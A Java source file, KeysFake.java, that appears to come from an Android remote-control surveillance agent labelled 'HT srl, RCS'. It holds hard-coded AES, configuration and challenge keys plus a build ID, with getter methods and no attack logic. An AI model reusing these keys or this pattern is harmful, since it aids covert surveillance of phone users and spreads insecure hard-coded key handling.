/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : KeysFake.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.crypto;

// ID 179 su rcs-castore
/**
 * The Class KeysFake.
 */
public class KeysFake extends Keys {
	
	// RCS 746
	byte[] AesKey = new byte[]{ (byte)0x12, (byte)0x35, (byte)0xcb, (byte)0xcb, (byte)0x67, (byte)0x90, (byte)0xfa, (byte)0x3c, (byte)0xd2, (byte)0xd9, (byte)0x8f, (byte)0x05, (byte)0x28, (byte)0xfb, (byte)0xb7, (byte)0x73 };
	byte[] ConfKey = new byte[] { (byte)0x14, (byte)0x17, (byte)0xd7, (byte)0xb7, (byte)0x1d, (byte)0xf3, (byte)0x2f, (byte)0xbf, (byte)0x21, (byte)0x40, (byte)0x31, (byte)0x57, (byte)0x2c, (byte)0xd1, (byte)0xd7, (byte)0xc9 };
	byte[] ChallengeKey = new byte[]{ (byte)0x57, (byte)0x2e, (byte)0xbc, (byte)0x94, (byte)0x39, (byte)0x12, (byte)0x81, (byte)0xcc, (byte)0xf5, (byte)0x3a, (byte)0x85, (byte)0x13, (byte)0x30, (byte)0xbb, (byte)0x0d, (byte)0x99 };
	String BuildId = "RCS_0000000746";

	public KeysFake() {
		super(false);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getAesKey()
	 */
	@Override
	public byte[] getAesKey() {
		return AesKey;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getChallengeKey()
	 */
	@Override
	public byte[] getChallengeKey() {
		return ChallengeKey;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getConfKey()
	 */
	@Override
	public byte[] getConfKey() {
		return ConfKey;
	}

	/*
	 * public byte[] getInstanceId() { return g_InstanceId; }
	 */

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getBuildId()
	 */
	@Override
	public byte[] getBuildId() {
		return BuildId.getBytes();
	}
}
